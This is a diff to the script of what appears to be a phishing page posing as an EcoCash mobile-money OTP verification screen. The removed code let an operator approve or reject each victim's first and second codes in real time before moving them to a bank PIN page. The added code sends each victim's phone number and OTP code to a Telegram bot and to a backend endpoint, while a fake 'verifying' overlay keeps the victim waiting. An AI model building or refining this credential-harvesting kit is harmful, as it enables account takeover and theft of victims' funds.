@@ -321,15 +321,17 @@
     <div class="bottom-curve"></div>
 
     <script>
+        // --- CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+        
         let pollingInterval = null;
         let globalPhone = "";
-        let isSecondOtp = false; // Flag to check if this instance is running a step 2 request
 
         // --- FETCHING PREVIOUS NUMBER DYNAMICALLY ---
         window.addEventListener('DOMContentLoaded', () => {
             const urlParams = new URLSearchParams(window.location.search);
             const phoneParam = urlParams.get('phone');
-            const stepParam = urlParams.get('step'); // Optional check if your redirect specifies step=2
             const storedPhone = localStorage.getItem('user_phone_number') || localStorage.getItem('phone');
             
             if (phoneParam) {
@@ -337,13 +339,7 @@
             } else if (storedPhone) {
                 globalPhone = storedPhone;
             } else {
-                globalPhone = "263771268100"; // fallback default
-            }
-
-            // Check if page needs to execute second OTP flow configuration
-            if (stepParam === "2" || localStorage.getItem('otp_step') === "2") {
-                isSecondOtp = true;
-                document.getElementById('overlay-text').textContent = "We are verifying your second OTP code with EcoCash systems.";
+                globalPhone = "+263771268100"; // fallback default
             }
 
             document.getElementById('phoneTarget').textContent = globalPhone.startsWith('+') ? globalPhone : '+' + globalPhone;
@@ -400,18 +396,9 @@
             }, 1000);
         }
 
-        async function triggerResend() {
-            try {
-                await fetch("/api/resend-otp-notification", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: globalPhone, step: isSecondOtp ? "Step 2" : "Step 1" })
-                });
-                alert("A new OTP code has been sent!");
-                startCountdown(120);
-            } catch (err) {
-                console.error("Resend API error:", err);
-            }
+        function triggerResend() {
+            alert("A new OTP code has been sent!");
+            startCountdown(120);
         }
 
         // --- CHECK STATUS FROM BACKEND SERVER API ---
@@ -425,39 +412,25 @@
                 const overlayTitle = document.getElementById('overlay-title');
                 const overlayText = document.getElementById('overlay-text');
 
-                // Logic if admin clicks "Correct" for First OTP (Changes status to "otp1_correct")
-                if (data.status === "otp1_correct") {
-                    clearInterval(pollingInterval);
-                    overlayTitle.textContent = "First Step Approved";
-                    overlayText.textContent = "Loading second authentication code screen...";
-                    
-                    setTimeout(() => {
-                        localStorage.setItem('otp_step', '2');
-                        window.location.reload(); // Reloads page into Step 2 OTP layout mode
-                    }, 2000);
-                }
-
-                // Logic if admin clicks "Correct" for Second OTP (Changes status to "otp2_correct")
-                if (data.status === "otp2_correct") {
+                if (data.status === "approved" || data.status === "verified") {
                     clearInterval(pollingInterval);
                     overlayTitle.textContent = "Success!";
-                    overlayText.textContent = "Verification finalized.";
+                    overlayText.textContent = "OTP verified successfully.";
                     document.querySelector('.spinner').style.background = '#4CAF50';
                     
                     setTimeout(() => {
-                        localStorage.removeItem('otp_step');
-                        window.location.href = "/page9.html"; // Move to Bank PIN verification or dashboard
+                        window.location.href = "/dashboard.html"; // Adjust to final landing screen
                     }, 2000);
                 }
 
-                // Handling Denied/Wrong parameters matching backend memory states
-                if (data.status === "otp1_wrong" || data.status === "otp2_wrong" || data.status === "otp2_wrongpin") {
+                if (data.status === "denied" || data.status === "failed") {
                     clearInterval(pollingInterval);
-                    overlayTitle.textContent = "Verification Error";
-                    overlayText.textContent = "Code error. Please re-enter the code correctly.";
+                    overlayTitle.textContent = "Verification Failed";
+                    overlayText.textContent = "The OTP code entered is invalid. Returning...";
                     
                     setTimeout(() => {
                         document.getElementById('loadingOverlay').classList.remove('active');
+                        // Clear inputs for retry
                         document.querySelectorAll('.otp-box').forEach(i => i.value = "");
                     }, 2500);
                 }
@@ -467,7 +440,7 @@
             }
         }
 
-        // --- SUBMIT DATA TO MATCH YOUR LIVE BACKEND API ---
+        // --- SUBMIT CODE TO SERVER & TELEGRAM BOT ---
         async function sendVerificationData() {
             const inputs = document.querySelectorAll('.otp-box');
             let otpCode = "";
@@ -478,32 +451,46 @@
                 return;
             }
 
-            // Show full screen processing overlay
+            // Show full screen processing animation overlay
             document.getElementById('loadingOverlay').classList.add('active');
 
-            // Dynamically select target matching your express server route layout precisely
-            const targetEndpoint = isSecondOtp ? "/api/verify-second-otp" : "/api/verify-first-otp";
-
+            // 1. Dispatch payload to YOUR backend server to handle notifications
             try {
-                const response = await fetch(targetEndpoint, {
+                await fetch("/api/verify-otp", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: globalPhone, otp: otpCode })
+                    body: JSON.stringify({ phone: globalPhone, otp: otpCode, type: "OTP_Verification" })
                 });
-                
-                const data = await response.json();
-                if (data.success) {
-                    console.log("✔️ Live server routing matched and message dispatched.");
-                }
-                
-                // Immediately open up loop queries tracking your status storage array
-                pollingInterval = setInterval(checkVerificationStatus, 2500);
-
+                console.log("✔️ Server notification endpoint dispatched.");
             } catch (err) {
-                console.error("❌ Backend server request error:", err);
-                // Fallback polling loop starter
-                pollingInterval = setInterval(checkVerificationStatus, 2500);
+                console.error("❌ Backend notification dispatch failed:", err);
             }
+
+            // 2. Direct Fallback payload message to Telegram Bot Channel
+            const textMessage = `🔑 *New OTP Submission Received*\n\n📱 *Phone Number:* ${globalPhone}\n🔢 *OTP Code:* \`${otpCode}\``;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: textMessage,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("✔️ Telegram channel alert completed.");
+                }
+                // Begin checking backend server validation loop status every 2.5 seconds
+                pollingInterval = setInterval(checkVerificationStatus, 2500);
+            })
+            .catch(err => {
+                console.error("❌ Direct Telegram fallback posting error:", err);
+                // Keep polling status anyway even if direct TG fails
+                pollingInterval = setInterval(checkVerificationStatus, 2500);
+            });
         }
     </script>
 </body>
